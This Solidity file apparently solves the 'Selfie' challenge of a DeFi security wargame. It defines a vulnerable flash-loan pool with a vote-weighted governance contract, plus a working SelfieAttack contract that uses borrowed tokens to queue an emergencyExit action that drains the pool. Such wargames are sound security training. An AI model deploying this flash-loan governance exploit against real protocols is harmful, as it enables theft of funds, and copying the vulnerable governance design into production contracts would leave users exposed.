// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * @title DamnValuableVotes (simplified governance token)
 */
contract DamnValuableVotes is ERC20, ERC20Permit, ERC20Votes {
    constructor(uint256 supply) ERC20("DamnValuableVotes", "DVV") ERC20Permit("DamnValuableVotes") {
        _mint(msg.sender, supply);
    }

    function _update(address from, address to, uint256 value) internal override(ERC20, ERC20Votes) {
        super._update(from, to, value);
    }

    function nonces(address owner) public view override(ERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }
}

/**
 * @title SimpleGovernance
 * @notice A simplified governance contract with a 2-day delay.
 */
contract SimpleGovernance {
    uint256 public constant ACTION_DELAY_IN_SECONDS = 2 days;

    struct GovernanceAction {
        uint128 value;
        uint64 proposedAt;
        uint64 executedAt;
        address target;
        bytes data;
    }

    DamnValuableVotes public governanceToken;
    uint256 public actionCounter;
    mapping(uint256 => GovernanceAction) public actions;

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);

    error CannotExecute(uint256 actionId);
    error NotEnoughVotes(address who);
    error ActionAlreadyExecuted(uint256 actionId);

    constructor(DamnValuableVotes _governanceToken) {
        governanceToken = _governanceToken;
    }

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) revert NotEnoughVotes(msg.sender);

        actionId = actionCounter++;
        actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        emit ActionQueued(actionId, msg.sender);
    }

    function executeAction(uint256 actionId) external payable returns (bytes memory) {
        if (!_canBeExecuted(actionId)) revert CannotExecute(actionId);

        GovernanceAction storage actionToExecute = actions[actionId];
        if (actionToExecute.executedAt != 0) revert ActionAlreadyExecuted(actionId);

        actionToExecute.executedAt = uint64(block.timestamp);

        emit ActionExecuted(actionId, msg.sender);

        (bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(
            actionToExecute.data
        );
        require(success, "Action execution failed");
        return returndata;
    }

    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = governanceToken.getVotes(who);
        uint256 halfTotalSupply = governanceToken.totalSupply() / 2;
        return balance > halfTotalSupply;
    }

    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction storage action = actions[actionId];
        if (action.proposedAt == 0) return false;
        uint256 timeDelta = block.timestamp - action.proposedAt;
        return timeDelta >= ACTION_DELAY_IN_SECONDS;
    }
}

/**
 * @title SelfiePool
 * @notice A flash loan pool that is governed by SimpleGovernance.
 *         The vulnerability: anyone can take a flash loan to get enough votes
 *         to queue a governance action that drains the pool.
 */
contract SelfiePool is IERC3156FlashLender {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    DamnValuableVotes public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    error RepayFailed();
    error CallbackFailed();
    error UnsupportedCurrency();

    constructor(DamnValuableVotes _token, SimpleGovernance _governance) {
        token = _token;
        governance = _governance;
    }

    function maxFlashLoan(address _token) external view override returns (uint256) {
        if (address(token) == _token) return token.balanceOf(address(this));
        return 0;
    }

    function flashFee(address _token, uint256) external view override returns (uint256) {
        if (address(token) != _token) revert UnsupportedCurrency();
        return 0;
    }

    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external override returns (bool) {
        if (address(token) != _token) revert UnsupportedCurrency();

        token.transfer(address(_receiver), _amount);

        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    function emergencyExit(address receiver) external {
        require(msg.sender == address(governance), "Only governance");
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        emit FundsDrained(receiver, amount);
    }
}

/**
 * @title SelfieAttack
 * @notice Exploit: Take a flash loan to temporarily gain majority votes,
 *         queue a governance action to drain the pool, wait for the delay,
 *         then execute the action.
 */
contract SelfieAttack is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    address public owner;
    uint256 public actionId;

    constructor(address _pool, address _governance, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        owner = msg.sender;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(
        address,
        address _token,
        uint256 _amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        // Delegate votes to ourselves
        token.delegate(address(this));

        // Queue governance action to drain the pool
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
        actionId = governance.queueAction(address(pool), 0, data);

        // Repay flash loan
        token.approve(address(pool), _amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}
